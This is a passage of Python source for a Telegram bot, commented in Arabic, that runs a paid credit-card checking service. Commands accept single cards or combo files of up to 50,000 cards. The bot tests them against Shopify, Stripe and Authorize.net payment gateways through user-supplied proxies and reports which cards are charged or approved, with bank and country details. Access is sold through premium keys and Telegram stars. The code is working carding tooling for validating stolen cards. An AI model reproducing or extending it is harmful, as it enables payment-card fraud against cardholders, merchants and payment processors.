        
        if admin_id not in ADMIN_ID:
            await event.answer("❌ Accεss Dεnιεd!", alert=True)
            return
        
        success, user_id, scan_data = await stop_scan_by_id(scan_id, admin_id)
        
        if success:
            await event.answer(f"✅ Sсаη {scan_id} sтσρρεd!", alert=True)
            await notify_user_scan_stopped(user_id, scan_id, admin_id)
            await event.edit(premium_emoji(f"✅ Sсаη <code>{scan_id}</code> Sтσρρεd SυccεssғυƖƖу!"), parse_mode='html')
        else:
            await event.answer(f"❌ Sсаη {scan_id} ησт ƒσυnd!", alert=True)
    elif data == "stop_all_scans":
        admin_id = event.sender_id
        
        if admin_id not in ADMIN_ID:
            await event.answer("❌ Accεss Dεnιεd!", alert=True)
            return
        
        scans = get_active_scans()
        stopped_count = 0
        
        for scan in scans:
            success, user_id, scan_data = await stop_scan_by_id(scan['scan_id'], admin_id)
            if success:
                stopped_count += 1
                await notify_user_scan_stopped(user_id, scan['scan_id'], admin_id)
        
        await event.answer(f"✅ Sтσρρεd {stopped_count} scαηs!", alert=True)
        await event.edit(premium_emoji(f"✅ Sтσρρεd {stopped_count} scαηs sυccεssғυƖƖу!"), parse_mode='html')
    elif data == "refresh_scans":
        await event.answer("🔄 Rεғɾεsнιηg...", alert=False)

# ==================== أوامر البوت الأساسية ====================
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    save_user(user_id, event.sender.username, event.sender.first_name)
    if is_banned(user_id):
        await event.reply(premium_emoji("🔨 Yσυ αɾε BANNED ƒɾσм тнιs bσт!"), parse_mode='html')
        return
    is_prem = is_premium(user_id)
    username = event.sender.username if event.sender.username else "User"
    plan = "🆓 Fɾεε" if not is_prem else "⭐ Pɾεмιυм"
    welcome_text = f"""────────────────────
► 👋 Hεу  · @{username}
► ρƖαη  · {plan}
────────────────────
<code>/cc</code> · <code>/chk</code> · <code>/sst</code> · <code>/mst</code> · <code>/ath</code> · <code>/mth</code> · <code>/addproxy</code>
────────────────────
One day I will be the best 
💡 Bσт Dεv <a href="https://t.me/P4_FN">Fᴀʀ³ᴏɴ</a> | <a href="https://t.me/E3_DB">Dᴀᴋᴋᴀ</a> | <a href="https://t.me/blackyahlw">Bʟᴀᴄᴋ</a> | <a href="https://t.me/zniir">Dᴀᴍᴀ</a>
 Vεrsιση -»4.0 🚀
────────────────────"""
    buttons = get_main_menu_keyboard(user_id)
    await event.reply(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')

# ==================== أمر إيقاف الفحص للمستخدم العادي ====================

@bot.on(events.NewMessage(pattern='/stopmyscan'))
async def stop_my_scan_command(event):
    user_id = event.sender_id
    
    if user_id in active_scans:
        scan_id = active_scans[user_id].get('scan_id', 'Unknown')
        active_scans[user_id]['stop_flag'] = True
        active_scans[user_id]['stopped_by'] = user_id
        active_scans[user_id]['stopped_at'] = time.time()
        await event.reply(premium_emoji(f"⏹️ Yσυɾ Sсаη <code>{scan_id}</code> Sтσρρεd SυccεssғυƖƖу!"), parse_mode='html')
    else:
        await event.reply(premium_emoji("❌ Nσ Aстιvε Sсаη Fσυnd Fσɾ Yσυ!"), parse_mode='html')

# ==================== أمر ستوب للكولباك ====================
@bot.on(events.CallbackQuery(pattern=rb"stop_scan:(\d+)"))
async def stop_scan_callback(event):
    user_id = event.sender_id
    
    if user_id in active_scans:
        scan_id = active_scans[user_id].get('scan_id', 'Unknown')
        active_scans[user_id]['stop_flag'] = True
        active_scans[user_id]['stopped_by'] = user_id
        active_scans[user_id]['stopped_at'] = time.time()
        await event.answer("⏹️ Sсаη Sтσρρεd!", alert=True)
        await event.edit(premium_emoji(f"⏹️ Yσυɾ Sсаη <code>{scan_id}</code> Sтσρρεd SυccεssғυƖƖу!"), parse_mode='html')
    else:
        await event.answer("❌ Nσ Aстιvε Sсаη Fσυnd!", alert=True)

# ==================== أوامر الأدمن لإدارة الفحوصات ====================

@bot.on(events.NewMessage(pattern='/activescans'))
async def active_scans_command(event):
    user_id = event.sender_id
    
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Accεss Dεnιεd!"), parse_mode='html')
        return
    
    scans = get_active_scans()
    
    if not scans:
        await event.reply(premium_emoji("📭 Nσ αcтιvε scαηs ƒσυnd."), parse_mode='html')
        return
    
    text = "🔍 <b>Aстιvε Sсаηs</b>\n\n"
    for scan in scans:
        elapsed = int(time.time() - scan['start_time'])
        hours = elapsed // 3600
        minutes = (elapsed % 3600) // 60
        seconds = elapsed % 60
        progress = f"{scan['processed']}/{scan['total']}" if scan['total'] > 0 else "0/0"
        
        text += f"""📌 <b>Sсаη ID:</b> <code>{scan['scan_id']}</code>
👤 <b>Usεr:</b> <code>{scan['user_id']}</code>
📠 <b>Tyρε:</b> {scan['type']}
📈 <b>Prσgrεss:</b> {progress} ({int(scan['processed']/scan['total']*100) if scan['total'] > 0 else 0}%)
⏱️ <b>Tιмε:</b> {hours:02d}:{minutes:02d}:{seconds:02d}
────────────────────

"""
    
    buttons = []
    for scan in scans[:5]:
        buttons.append([Button.inline(
            f"⏹ Stop {scan['scan_id'][-6:]}", 
            f"stop_scan:{scan['scan_id']}".encode(),
            style="danger"
        )])
    
    if len(scans) > 5:
        buttons.append([Button.inline(
            f"⏹ Stop All Scans", 
            b"stop_all_scans",
            style="danger"
        )])
    
    buttons.append([Button.inline("🔄 Refresh", b"refresh_scans", style="primary")])
    buttons.append([Button.inline("🔙 Bαcκ", b"admin_panel", style="danger")])
    
    await event.reply(premium_emoji(text), buttons=buttons, parse_mode='html')

@bot.on(events.NewMessage(pattern='/stopscan'))
async def stop_scan_by_id_command(event):
    user_id = event.sender_id
    
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Accεss Dεnιεd!"), parse_mode='html')
        return
    
    parts = event.raw_text.split()
    if len(parts) != 2:
        await event.reply(premium_emoji("📝 Usαgε: <code>/stopscan SCAN_ID</code>\n\nExample: <code>/stopscan SCAN_1_1234567890</code>"), parse_mode='html')
        return
    
    scan_id = parts[1]
    success, target_user, data = await stop_scan_by_id(scan_id, user_id)
    
    if success:
        await notify_user_scan_stopped(target_user, scan_id, user_id)
        await event.reply(premium_emoji(f"✅ Sсаη <code>{scan_id}</code> sтσρρεd sυccεssғυƖƖу!"), parse_mode='html')
    else:
        await event.reply(premium_emoji(f"❌ Sсаη <code>{scan_id}</code> ησт ƒσυnd!"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/stopallscans'))
async def stop_all_scans_command(event):
    user_id = event.sender_id
    
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Accεss Dεnιεd!"), parse_mode='html')
        return
    
    scans = get_active_scans()
    if not scans:
        await event.reply(premium_emoji("📭 Nσ αcтιvε scαηs тσ sтσρ."), parse_mode='html')
        return
    
    status_msg = await event.reply(premium_emoji("🔄 Sтσρριηg αƖƖ scαηs..."), parse_mode='html')
    
    stopped_count = 0
    for scan in scans:
        success, target_user, data = await stop_scan_by_id(scan['scan_id'], user_id)
        if success:
            stopped_count += 1
            await notify_user_scan_stopped(target_user, scan['scan_id'], user_id)
        await asyncio.sleep(0.5)
    
    await bot.edit_message(
        user_id, 
        status_msg.id, 
        premium_emoji(f"""✅ AƖƖ Sсаηs Sтσρρεd!

📠 Sтσρρεd: <b>{stopped_count}</b> scαηs
👤 Sтσρρεd Bу: <code>{user_id}</code>
⏱️ Tιмε: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""),
        parse_mode='html'
    )

# ==================== أوامر المستخدم ====================

@bot.on(events.NewMessage(pattern='/cc'))
async def cc_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(premium_emoji("🔨 Yσυ αɾε BANNED!"), parse_mode='html')
        return
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Accεss Dεnιεd\n\nOηƖy ρɾεмιυм υsεrs cαη υsε тнιs bσт."), parse_mode='html')
        return
    user_proxies = load_user_proxies(user_id)
    if not user_proxies:
        await event.reply(premium_emoji("❌ Nσ ρɾσxιεs ιη yσυɾ Ɩιsт!\n\n📝 Usε /αddρɾσxy τσ αdd ρɾσxιεs."), parse_mode='html')
        return
    sites = load_sites()
    if not sites:
        await event.reply(premium_emoji("❌ Nσ sιтεs αvαιƖαвƖε. PƖεαsε cσηтαcт α∂мιη."), parse_mode='html')
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        await event.reply(premium_emoji("📝 Usαgε: <code>/cc cαrd|мм|уу|cvv</code>"), parse_mode='html')
        return
    cc_input = parts[1].strip()
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji("❌ IηvαƖιd CC ƒσrmαт. Usε: <code>/cc cαrd|мм|уу|cvv</code>"), parse_mode='html')
        return
    card = cards[0]
    status_msg = await event.reply(premium_emoji(f"🔄 Cнεcκιηg <code>{card}</code>..."), parse_mode='html')
    try:
        proxies = load_user_proxies(user_id)
        result = await check_card_with_retry_worker(card, sites, proxies)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        if result['status'] == 'Charged':
            status_header = "💎 Cнαɾgεd"
        elif result['status'] == 'Approved':
            status_header = "✅ Aρρɾσvεd"
        else:
            status_header = "❌ DεcƖιηεd"
        gateway_display = result.get('gateway', 'Unknown')
        if 'Stripe Auth' in gateway_display or 'stripe auth' in gateway_display.lower():
            gateway_display = 'Shopify'
        response = f"""{status_header}
💳 CC <code>{result['card']}</code>
🛒 Gαтεωαу {gateway_display}
📝 Rεsρσηsε {result['message'][:150]}
💰 Pɾιcε {result.get('price', '$0.00')}
🔢 BIN Iηƒσ {brand} - {bin_type} - {level}
🏦 Bαηк {bank}
🌍 Cσυηтɾу {country} {flag}
💡 Mαdε Bу <a href="https://t.me/blackyahlw">Bʟᴀᴄᴋ</a> | <a href="https://t.me/E3_DB">Dᴀᴋᴋᴀ</a> | <a href="https://t.me/P4_FN">Fᴀʀ³ᴏɴ</a> | <a href="https://t.me/zniir">Dᴀᴍᴀ</a>"""
        await bot.edit_message(user_id, status_msg.id, premium_emoji(response), parse_mode='html')
    except Exception as e:
        await bot.edit_message(user_id, status_msg.id, premium_emoji(f"❌ Eɾɾσɾ: {str(e)}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/chk'))
async def chk_command_500(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(premium_emoji("🔨 Yσυ αɾε BANNED!"), parse_mode='html')
        return
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Accεss Dεnιεd\n\nOηƖy ρɾεмιυм υsεrs cαη υsε тнιs bσт."), parse_mode='html')
        return
    
    user_proxies = load_user_proxies(user_id)
    if not user_proxies:
        await event.reply(premium_emoji("❌ Nσ ρɾσxιεs ιη yσυɾ Ɩιsт!\n\n📝 Usε /αddρɾσxy τσ αdd ρɾσxιεs."), parse_mode='html')
        return    
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ PƖεαsε ɾερƖу тσ α .тxт ғιƖε."), parse_mode='html')
        return
    
    if user_id in active_scans:
        await event.reply(premium_emoji("⚠️ Yσυ αƖɾεα∂у нαvε αη αcтιvε scαη!\n\n📌 Usε /sтσρмyscαη тσ sтσρ ғιяsт."), parse_mode='html')
        return
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ PƖεαsε ɾερƖу тσ α .тxт ғιƖε."), parse_mode='html')
        return
    
    file_path = await reply_msg.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        cards = extract_cc(content)
        if not cards:
            await event.reply(premium_emoji("❌ Nσ vαƖι∂ cαя∂s ғσυη∂ ιη ғιƖε."), parse_mode='html')
            if os.path.exists(file_path):
                os.remove(file_path)
            return
        
        if len(cards) > 50000:
            await event.reply(
                premium_emoji(f"""❌ <b>Mαxιмυм Lιмιт Excεεdεd!</b>

📠 Yσυя ғιƖε cσтαιηs: <b>{len(cards)}</b> cαя∂s
🚫 Mαxιмυм αƖƖσωε∂: <b>50000</b> cαя∂s

📌 PƖεαsε sρƖιт yσυя ғιƖε υsιηg /sρƖιт"""),
                parse_mode='html'
            )
            if os.path.exists(file_path):
                os.remove(file_path)
            return
        
        sites = load_sites()
        if not sites:
            await event.reply(premium_emoji("❌ Nσ sιтεs αvαιƖαвƖε!"), parse_mode='html')
            if os.path.exists(file_path):
                os.remove(file_path)
            return
        
        TEMP_FILE_DATA[user_id] = {
            'cards': cards,
            'total': len(cards)
        }
        
        filters = load_price_filters()
        gateway_filters = filters.get('shopify_global', DEFAULT_FILTERS)
        buttons = []
        row = []
        for i, f in enumerate(gateway_filters):
            row.append(Button.inline(f["name"], f"price_fltr:{i}:{user_id}".encode(), style="primary"))
            if len(row) == 2:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)
        buttons.append([Button.inline("❌ CαηcεƖ", b"cancel_filter", style="danger")])
        
        status_msg = await event.reply(premium_emoji(f"""📁 FιƖε Lσαdεd: {len(cards)} cαɾds

🔌 Yσυɾ Pɾσxιεs: {len(user_proxies)}
💰 SεƖεcт α ρɾιcε ғιƖтεr:"""), buttons=buttons, parse_mode='html')
        
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eяяσя: {str(e)}"), parse_mode='html')
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

@bot.on(events.NewMessage(pattern='/sst'))
async def sst_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(premium_emoji("🔨 Yσυ αɾε BANNED!"), parse_mode='html')
        return
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Accεss Dεnιεd\n\nOηƖy ρɾεмιυм υsεrs cαη υsε тнιs bσт."), parse_mode='html')
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        await event.reply(premium_emoji("📝 Usαgε: <code>/sst 4111111111111111|12|26|123</code>"), parse_mode='html')
        return
    card_str = parts[1].strip()
    if not card_str:
        await event.reply(premium_emoji("❌ Cαɾd ιs εмρту."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji("🔄 Cнεcκιηg..."), parse_mode='html')
    try:
        result = await asyncio.to_thread(check_single_card, card_str)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card_str.split('|')[0])
        if result['status'] == 'APPROVED':
            emoji = "✅"
            status_text = "Aρρɾσvεd"
        elif result['status'] == 'DECLINED':
            emoji = "❌"
            status_text = "DεcƖιηεd"
        else:
            emoji = "⚠️"
            status_text = "Eɾɾσɾ"
        gateway_display = result.get('gateway', 'NexaHome Stripe')
        price = result.get('price', '$0.00')
        if price == '-' or price == '':
            price = '$0.00'
        response = f"""{emoji} : <b>{status_text}</b>
 - - - - - - - - - - - - - - - - - - - - - - -
💳 CC <code>{result['card']}</code>
🛒 Gαтεωαу {gateway_display}
📝 Rεsρσηsε {result['message']}
💰 Pɾιcε {price}
 - - - - - - - - - - - - - - - - - - - - - - -
🔢 BIN Iηƒσ <b>{brand}</b> - <b>{bin_type}</b> - <b>{level}</b>
🏦 Bαηк {bank}
🌍 Cσυηтɾу {country} {flag}
💡 Mαdε Bу <a href="https://t.me/blackyahlw">Bʟᴀᴄᴋ</a> | <a href="https://t.me/E3_DB">Dᴀᴋᴋᴀ</a> | <a href="https://t.me/P4_FN">Fᴀʀ³ᴏɴ</a> | <a href="https://t.me/zniir">Dᴀᴍᴀ</a>"""
        await bot.edit_message(user_id, status_msg.id, premium_emoji(response), parse_mode='html')
    except Exception as e:
        await bot.edit_message(user_id, status_msg.id, premium_emoji(f"❌ Eɾɾσɾ: {str(e)}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/mst'))
async def mst_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(premium_emoji("🔨 Yσυ αɾε BANNED!"), parse_mode='html')
        return
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Accεss Dεnιεd\n\nOηƖy ρɾεмιυм υsεrs cαη υsε тнιs bσт."), parse_mode='html')
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Yσυ Mυsт RερƖу Tσ A Mεssαgε Cσηтαιηιηg A .тxт FιƖε"), parse_mode='html')
        return
    
    if user_id in active_scans:
        await event.reply(premium_emoji("⚠️ Yσυ αƖɾεα∂у нαvε αη αcтιvε scαη!\n\n📌 Usε /sтσρмyscαη тσ sтσρ ғιяsт."), parse_mode='html')
        return
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Yσυ Mυsт RερƖу Tσ A .тxт FιƖε"), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji("🔄 DσwnƖσαdιηg ғιƖε..."), parse_mode='html')
    file_path = await reply_msg.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        cards = extract_cc(content)
        if not cards:
            await bot.edit_message(user_id, status_msg.id, premium_emoji("❌ Nσ VαƖιd Cαɾds Fσυnd Iη FιƖε"), parse_mode='html')
            if os.path.exists(file_path):
                os.remove(file_path)
            return
        
        if len(cards) > 3000:
            await bot.edit_message(
                user_id, 
                status_msg.id, 
                premium_emoji(f"""❌ <b>Mαxιмυм Lιмιт Excεεdεd!</b>

📠 Yσυɾ ғιƖε cσntαιns: <b>{len(cards)}</b> cαɾds
🚫 Mαxιмυм αƖƖσωεd: <b>3000</b> cαɾds

📌 PƖεαsε sρƖιτ yσυɾ ғιƖε υsιηg /sρƖιτ"""),
                parse_mode='html'
            )
            if os.path.exists(file_path):
                os.remove(file_path)
            return
        
        await bot.edit_message(user_id, status_msg.id, premium_emoji(f"🔄 Cнεcκιηg Cσмвσ (NεxαHσмε Sтɾιρe)\n\n📠 TσταƖ: {len(cards)} Cαɾds\n⚠️ Usε /sтσρмyscαη тσ sтσρ"), parse_mode='html')
        
        asyncio.create_task(run_combo_scan_async(user_id, cards, status_msg, file_path))
    except Exception as e:
        await bot.edit_message(user_id, status_msg.id, premium_emoji(f"❌ Eɾɾσɾ: {str(e)}"), parse_mode='html')
        if os.path.exists(file_path):
            os.remove(file_path)

@bot.on(events.NewMessage(pattern='/redeem'))
async def redeem_key(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(premium_emoji("🔨 Yσυ αɾε BANNED!"), parse_mode='html')
        return
    parts = event.raw_text.split()
    if len(parts) != 2:
        await event.reply(premium_emoji("📝 Usαgε: <code>/redeem Kεy</code>"), parse_mode='html')
        return
    key = parts[1].upper()
    keys_data = load_keys()
    if key not in keys_data:
        await event.reply(premium_emoji("❌ IηvαƖιd Kεy!"), parse_mode='html')
        return
    key_data = keys_data[key]
    expiry = datetime.fromisoformat(key_data['expiry'])
    current_date = datetime.now()
    if current_date > expiry:
        await event.reply(premium_emoji("❌ Tнιs kεy нαs EXPIRED!"), parse_mode='html')
        return
    if key_data['used_count'] >= key_data['user_limit']:
        await event.reply(premium_emoji(f"❌ Tнιs kεy нαs rεαcнεd ιтs Ɩιмιт ({key_data['user_limit']})"), parse_mode='html')
        return
    user_id_str = str(user_id)
    if user_id_str in key_data['used_by']:
        await event.reply(premium_emoji("❌ Yσυ нαvε αƖrεα∂у υsεd тнιs kεy!"), parse_mode='html')
        return
    if is_premium(user_id):
        await event.reply(premium_emoji("❌ Yσυ αƖrεα∂у нαvε ρrεмιυм αccεss!"), parse_mode='html')
        return
    user_expiry = current_date + timedelta(hours=key_data['hours'])
    add_premium_user(user_id, user_expiry)
    key_data['used_count'] += 1
    key_data['used_by'].append(user_id_str)
    key_data['used_at'] = current_date.isoformat()
    keys_data[key] = key_data
    save_keys(keys_data)
    hours_display = key_data['hours']
    days_display = f"{hours_display} нσυrs" if hours_display < 24 else f"{hours_display // 24} dαys"
    await event.reply(premium_emoji(f"""🎉 CσηgrαтυƖαтισηs!
⭐ VIP Aссεss Aстιvαтεd!
🔄 Dυrαтιση: {days_display}"""), parse_mode='html')

@bot.on(events.NewMessage(pattern='/buy'))
async def buy_premium_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(premium_emoji("🔨 Yσυ αɾε BANNED!"), parse_mode='html')
        return
    text = """⭐ Pɾεмιυм Sυbscɾιρтισηs
⏱️ 1 Hᴏᴜʀ — 10 ⭐
🔄 1 Dᴀʏ — 30 ⭐
📆 1 Wᴇᴇᴋ — 100 ⭐
👆 Cнσσsε yσυr ρƖαη:"""
    buttons = [
        [Button.inline("⏱️ 1 Hᴏᴜʀ - 10 ⭐", b"buy_premium:hour", style="primary")],
        [Button.inline("🔄 1 Dᴀʏ - 30 ⭐", b"buy_premium:day", style="primary")],
        [Button.inline("📆 1 Wᴇᴇᴋ - 100 ⭐", b"buy_premium:week", style="success")],
        [Button.inline("🔙 Bαcκ", b"main_menu", style="danger")]
    ]
    await event.reply(premium_emoji(text), buttons=buttons, parse_mode='html')

# ==================== أوامر Authorize.net ====================

@bot.on(events.NewMessage(pattern='/ath'))
async def authnet_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(premium_emoji("🔨 Yσυ αɾε BANNED!"), parse_mode='html')
        return
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Accεss Dεnιεd\n\nOηƖy ρɾεмιυм υsεrs cαη υsε тнιs bσт."), parse_mode='html')
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        await event.reply(premium_emoji("📝 Usαgε: <code>/ath cαrd|мм|уу|cvv</code>"), parse_mode='html')
        return
    cc_input = parts[1].strip()
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji("❌ IηvαƖιd CC ƒσrmαт. Usε: <code>/ath cαrd|мм|уу|cvv</code>"), parse_mode='html')
        return
    card = cards[0]
    status_msg = await event.reply(premium_emoji(f"🔄 Cнεcκιηg <code>{card}</code> vια Aυтнσɾιzε.Nεт..."), parse_mode='html')
    try:
        result = await asyncio.to_thread(authnet_checker, card)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        if result['status'] == 'APPROVED':
            emoji = "✅"
            status_text = "Aρρɾσvεd"
        elif result['status'] == 'DECLINED':
            emoji = "❌"
            status_text = "DεcƖιηεd"
        else:
            emoji = "⚠️"
            status_text = "Eɾɾσɾ"
        price = result.get('price', '$0.00')
        response = f"""{emoji} : <b>{status_text}</b>
 - - - - - - - - - - - - - - - - - - - - - - -
💳 CC <code>{result['card']}</code>
🛒 Gαтεωαу Aυтнσɾιzε.Nεт
📝 Rεsρσηsε {result['message']}
💰 Pɾιcε {price}
 - - - - - - - - - - - - - - - - - - - - - - -
🔢 BIN Iηƒσ <b>{brand}</b> - <b>{bin_type}</b> - <b>{level}</b>
🏦 Bαηк {bank}
🌍 Cσυηтɾу {country} {flag}
💡 Mαdε Bу <a href="https://t.me/blackyahlw">Bʟᴀᴄᴋ</a> | <a href="https://t.me/E3_DB">Dᴀᴋᴋᴀ</a> | <a href="https://t.me/P4_FN">Fᴀʀ³ᴏɴ</a> | <a href="https://t.me/zniir">Dᴀᴍᴀ</a>"""
        await bot.edit_message(user_id, status_msg.id, premium_emoji(response), parse_mode='html')
    except Exception as e:
        await bot.edit_message(user_id, status_msg.id, premium_emoji(f"❌ Eɾɾσɾ: {str(e)}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/mth'))
async def mth_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(premium_emoji("🔨 Yσυ αɾε BANNED!"), parse_mode='html')
        return
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Accεss Dεnιεd\n\nOηƖy ρɾεмιυм υsεrs cαη υsε тнιs bσт."), parse_mode='html')
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Yσυ Mυsт RερƖу Tσ A Mεssαgε Cσηтαιηιηg A .тxт FιƖε"), parse_mode='html')
        return
    
    if user_id in active_scans:
        await event.reply(premium_emoji("⚠️ Yσυ αƖɾεα∂у нαvε αη αcтιvε scαη!\n\n📌 Usε /sтσρмyscαη тσ sтσρ ғιяsт."), parse_mode='html')
        return
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Yσυ Mυsт RερƖу Tσ A .тxт FιƖε"), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji("🔄 DσwnƖσαdιηg ғιƖε..."), parse_mode='html')
    file_path = await reply_msg.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        cards = extract_cc(content)
        if not cards:
            await bot.edit_message(user_id, status_msg.id, premium_emoji("❌ Nσ VαƖιd Cαɾds Fσυnd Iη FιƖε"), parse_mode='html')
            if os.path.exists(file_path):
                os.remove(file_path)
            return
        
        if len(cards) > 3000:
            await bot.edit_message(
                user_id, 
                status_msg.id, 
                premium_emoji(f"""❌ <b>Mαxιмυм Lιмιт Excεεdεd!</b>

📠 Yσυɾ ғιƖε cσntαιns: <b>{len(cards)}</b> cαɾds
🚫 Mαxιмυм αƖƖσωεd: <b>3000</b> cαɾds

📌 PƖεαsε sρƖιτ yσυɾ ғιƖε υsιηg /sρƖιτ"""),
                parse_mode='html'
            )
            if os.path.exists(file_path):
                os.remove(file_path)
            return
        
        await bot.edit_message(user_id, status_msg.id, premium_emoji(f"🔄 Cнεcκιηg Cσмвσ vια Aυтнσɾιzε.Nεт\n\n📠 TσταƖ: {len(cards)} Cαɾds\n⚠️ Usε /sтσρмyscαη тσ sтσρ"), parse_mode='html')
        
        asyncio.create_task(run_authnet_combo_scan_async(user_id, cards, status_msg, file_path))
    except Exception as e:
        await bot.edit_message(user_id, status_msg.id, premium_emoji(f"❌ Eɾɾσɾ: {str(e)}"), parse_mode='html')
        if os.path.exists(file_path):
            os.remove(file_path)

# ==================== أوامر البروكسي للمستخدمين ====================

@bot.on(events.NewMessage(pattern='/addproxy'))
async def addproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(premium_emoji("🔨 Yσυ αɾε BANNED!"), parse_mode='html')
        return
    if event.reply_to_msg_id:
        reply_msg = await event.get_reply_message()
        if reply_msg.file and reply_msg.file.name.endswith('.txt'):
            status_msg = await event.reply(premium_emoji("⚡ DσwnƖσαdιηg ғιƖε..."), parse_mode='html')
            file_path = await reply_msg.download_media()
            try:
                async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = await f.read()
                proxies_to_add = [line.strip() for line in content.splitlines() if line.strip() and not line.startswith('#')]
                if not proxies_to_add:
                    await bot.edit_message(user_id, status_msg.id, premium_emoji("❌ Nσ ρɾσxιεs ƒσυnd."), parse_mode='html')
                    if os.path.exists(file_path):
                        os.remove(file_path)
                    return
                await bot.edit_message(user_id, status_msg.id, premium_emoji(f"🚀 Cнεcκιηg {len(proxies_to_add)} ρɾσxιεs..."), parse_mode='html')
                current_proxies = load_user_proxies(user_id)
                alive_proxies = []
                dead_proxies = []
                already_exists = []
                for i, proxy in enumerate(proxies_to_add, 1):
                    if i % 5 == 0 or i == len(proxies_to_add):
                        await bot.edit_message(user_id, status_msg.id, premium_emoji(f"🔄 [{i}/{len(proxies_to_add)}] | ✅ AƖιvε: {len(alive_proxies)} | ❌ Dεαd: {len(dead_proxies)}"), parse_mode='html')
                    if proxy in current_proxies:
                        already_exists.append(proxy)
                        continue
                    result = await test_proxy(proxy)
                    if result['status'] == 'alive':
                        alive_proxies.append(proxy)
                        add_user_proxy(user_id, proxy)
                    else:
                        dead_proxies.append(proxy)
                total_proxies = get_user_proxy_count(user_id)
                result_text = f"""🚀 Pɾσxy Cнεcκ CσмρƖεтεd!
📠 RεsυƖтs:
   ├─ ✅ AƖιvε: {len(alive_proxies)}
   ├─ ❌ Dεαd: {len(dead_proxies)}
   ├─ ⚠️ Exιsтιηg: {len(already_exists)}
   └─ 📠 TσταƖ ιη Ɩιsт: {total_proxies}"""
                if alive_proxies:
                    result_text += f"\n\n✅ A∂∂εd Pɾσxιεs:\n"
                    for p in alive_proxies[:5]:
                        result_text += f"   • <code>{p}</code>\n"
                    if len(alive_proxies) > 5:
                        result_text += f"   ... αηd {len(alive_proxies) - 5} мσяε\n"
                await bot.edit_message(user_id, status_msg.id, premium_emoji(result_text), parse_mode='html')
            except Exception as e:
                await bot.edit_message(user_id, status_msg.id, premium_emoji(f"❌ Eɾɾσɾ: {str(e)}"), parse_mode='html')
            finally:
                if os.path.exists(file_path):
                    os.remove(file_path)
            return
    parts = event.raw_text.split('\n')
    if len(parts) < 2:
        await event.reply(premium_emoji("""📝 Usαgε: /αddρɾσxy
📌 3 тyρεs:
1️⃣ Lιេង ву Ɩιηε:
<code>/addproxy
192.168.1.1:8080
192.168.1.2:8080:user:pass</code>
2️⃣ Cσммα sεραrαтεd:
<code>/addproxy 192.168.1.1:8080,192.168.1.2:8080:user:pass</code>
3️⃣ FιƖε (.тxт):
<code>RερƖу тσ .тxт ғιƖε ωιтᏂ /addproxy</code>"""), parse_mode='html')
        return
    proxies_to_add = []
    for line in parts[1:]:
        line = line.strip()
        if not line:
            continue
        if ',' in line:
            for p in line.split(','):
                p = p.strip()
                if p and not p.startswith('#'):
                    proxies_to_add.append(p)
        else:
            if not line.startswith('#'):
                proxies_to_add.append(line)
    if not proxies_to_add:
        await event.reply(premium_emoji("❌ Nσ ρɾσxιεs ρɾσvιdεd."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji(f"🚀 Cнεcκιηg {len(proxies_to_add)} ρɾσxιεs..."), parse_mode='html')
    current_proxies = load_user_proxies(user_id)
    alive_proxies = []
    dead_proxies = []
    already_exists = []
    for i, proxy in enumerate(proxies_to_add, 1):
        if i % 5 == 0 or i == len(proxies_to_add):
